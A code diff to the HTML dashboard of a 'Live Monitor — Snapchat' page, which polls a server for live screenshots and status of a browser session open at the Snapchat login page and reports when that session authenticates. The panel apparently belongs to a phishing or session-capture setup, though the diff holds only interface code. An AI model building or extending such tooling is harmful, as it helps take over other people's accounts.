@@ -128,6 +128,18 @@
             border-radius: 50%; 
             animation: pulse 2s infinite;
         }
+        .status.connecting {
+            color: #eab308;
+        }
+        .status.connecting .status-dot {
+            background: #eab308;
+        }
+        .status.error {
+            color: #ef4444;
+        }
+        .status.error .status-dot {
+            background: #ef4444;
+        }
         @keyframes pulse { 
             0%, 100% { opacity: 1; } 
             50% { opacity: 0.4; } 
@@ -138,12 +150,32 @@
             border-radius: 10px; 
             overflow: hidden; 
             aspect-ratio: 16/9;
+            position: relative;
         }
-        .feed-frame img { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
+        .feed-frame img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
             display: block;
+            border: none;
+        }
+        .feed-overlay {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            color: #22c55e;
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-family: monospace;
+        }
+        .feed-frame img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            border: none;
         }
         .feed-offline { 
             display: flex; 
@@ -184,14 +216,18 @@
         
         <div class="feed-section">
             <div class="feed-header">
-                <span>Live Monitor</span>
-                <div class="status">
+                <span>Live Monitor — Snapchat</span>
+                <div id="status-badge" class="status">
                     <div class="status-dot"></div>
-                    Active
+                    <span id="status-text">Starting session...</span>
                 </div>
             </div>
             <div class="feed-frame">
-                <img id="feed" src="/screenshot?t=0" onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=\'feed-offline\'>stream offline</div>';">
+                <img id="feed" src="/screenshot?t=0" onerror="this.src='/screenshot?t=' + Date.now()">
+                <div id="feed-status" class="feed-overlay">LIVE • Snapchat Login</div>
+            </div>
+            <div style="margin-top:8px; font-size:11px; color:#555; text-align:center;">
+                Page is loaded at <strong>accounts.snapchat.com/accounts/login</strong>
             </div>
         </div>
     </div>
@@ -213,13 +249,86 @@
                 alert('session authenticated successfully');
             });
         }
-        setInterval(() => {
+        
+        let lastUpdate = Date.now();
+        
+        function updateFeed() {
             const img = document.getElementById('feed');
-            if (img) {
-                img.style.display = 'block';
-                img.src = '/screenshot?t=' + Date.now();
-            }
-        }, 1000);
+            const statusEl = document.getElementById('feed-status');
+            if (!img) return;
+            
+            img.style.display = 'block';
+            const timestamp = Date.now();
+            img.src = '/screenshot?t=' + timestamp;
+            
+            // Also refresh status
+            fetch('/status')
+                .then(r => r.json())
+                .then(data => {
+                    console.log('Session status:', data);
+                    
+                    const badge = document.getElementById('status-badge');
+                    const statusText = document.getElementById('status-text');
+                    
+                    if (statusText) {
+                        if (data.snapchat_loaded) {
+                            statusText.textContent = 'Live — Snapchat login';
+                            if (badge) badge.className = 'status';
+                        } else if (data.started && !data.snapchat_loaded) {
+                            statusText.textContent = 'Connecting...';
+                            if (badge) badge.className = 'status connecting';
+                        } else if (data.error) {
+                            statusText.textContent = 'Fallback mode';
+                            if (badge) badge.className = 'status error';
+                        } else {
+                            statusText.textContent = 'Session active';
+                        }
+                    }
+                    
+                    if (statusEl) {
+                        if (data.snapchat_loaded) {
+                            statusEl.textContent = 'LIVE • Snapchat Login';
+                            statusEl.style.color = '#22c55e';
+                        } else {
+                            statusEl.textContent = 'LIVE (fallback)';
+                            statusEl.style.color = '#eab308';
+                        }
+                    }
+                    
+                    // Visual border feedback
+                    if (data.snapchat_loaded) {
+                        img.style.border = '3px solid #22c55e';
+                    } else if (data.started) {
+                        img.style.border = '3px solid #eab308';
+                    }
+                })
+                .catch(() => {
+                    const statusText = document.getElementById('status-text');
+                    if (statusText) statusText.textContent = 'Live feed';
+                });
+        }
+        
+        // Start live updates immediately (more aggressive)
+        setInterval(updateFeed, 800);
+        
+        // Force first update right away
+        setTimeout(() => {
+            updateFeed();
+        }, 300);
+        
+        // Log when image loads successfully
+        const feedImg = document.getElementById('feed');
+        if (feedImg) {
+            feedImg.onload = () => {
+                console.log('✅ Live Snapchat screenshot updated');
+            };
+            feedImg.onerror = (e) => {
+                console.warn('Screenshot load error, retrying...');
+            };
+        }
+        
+        // Show immediate status
+        console.log('%c[SNAPCHAT] Waiting for live session feed...', 'color:#22c55e');
     </script>
 </body>
 </html>
